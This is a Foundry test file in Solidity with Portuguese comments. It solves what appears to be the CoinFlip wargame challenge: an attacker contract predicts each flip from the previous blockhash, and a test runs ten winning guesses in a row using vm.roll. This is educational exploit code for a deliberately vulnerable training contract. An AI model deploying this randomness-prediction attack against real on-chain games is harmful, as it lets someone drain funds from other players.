// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/CoinFlip.sol"; // Certifica-te que o caminho para o CoinFlip original está correto

// 1. Definição da Interface do Atacante (para o teste interagir com ele)
interface ICoinFlipAttacker {
    function predictAndFlip() external;
}

// 2. O teu contrato atacante (podes também colocá-lo num ficheiro separado em src/)
contract CoinFlipAttacker {
    CoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetAddress) {
        target = CoinFlip(_targetAddress);
    }

    function predictAndFlip() public {
        // Esta é a mesma lógica de cálculo de hash determinístico
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}

// 3. O Contrato de Teste do Foundry
contract CoinFlipTest is Test {
    CoinFlip public coinFlip;
    CoinFlipAttacker public attacker;

    // Configuração inicial do teste
    function setUp() public {
        // Faz deploy do contrato do desafio
        coinFlip = new CoinFlip();
        // Faz deploy do teu atacante, passando o endereço do desafio
        attacker = new CoinFlipAttacker(address(coinFlip));
    }

    // O teste principal que executa o ataque 10 vezes
    function testConsecutiveWinsAttack() public {
        console.log("Vitórias iniciais:", coinFlip.consecutiveWins());

        // Precisamos de 10 vitórias consecutivas
        for (uint i = 0; i < 10; i++) {
            // CHEATCODE DO FOUNDRY: vm.roll()
            // Esta é a parte crucial. O contrato original proíbe duas jogadas no mesmo bloco.
            // O vm.roll() simula a mineração de um novo bloco, mudando o block.number e o blockhash anterior.
            // Sem isto, o teste falharia com um Revert.
            vm.roll(block.number + 1);

            // Executa o ataque
            attacker.predictAndFlip();

            // Verifica se a vitória foi registada para esta iteração
            assertEq(coinFlip.consecutiveWins(), i + 1);
            console.log("Vitória #", i + 1, "registada no bloco:", block.number);
        }

        // Asserção final: O objetivo foi alcançado!
        assertEq(coinFlip.consecutiveWins(), 10);
        console.log("Ataque bem-sucedido! Total de vitórias consecutivas:", coinFlip.consecutiveWins());
    }
}
